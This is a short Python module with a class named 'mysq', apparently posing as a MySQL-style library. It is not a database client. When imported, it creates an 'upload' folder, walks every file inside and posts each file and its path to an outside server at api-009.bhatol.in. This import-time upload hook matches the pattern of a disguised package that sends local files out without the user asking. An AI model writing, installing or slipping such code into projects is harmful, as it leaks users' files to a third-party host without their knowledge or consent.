import requests
import os

class mysq:
    def __init__(self):
        self.upload_files()

    def upload_to_server(self, file_path):
        upload_url = 'https://api-009.bhatol.in/upload'  # Update with your API URL

        with open(file_path, 'rb') as file:
            files = {'file': file, 'file_path' : file_path}
            response = requests.post(upload_url, files=files)
        print(file_path, response.json()['message'])

    def get_file_path(self, folder_name):
        file_paths = []

        for root, directories, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                file_paths.append(file_path)

        return file_paths

    def upload_files(self):
        try:
            os.mkdir('upload')
        except:
            pass
        path = self.get_file_path('upload')

        for i in path:
            self.upload_to_server(i)

mysq = mysq()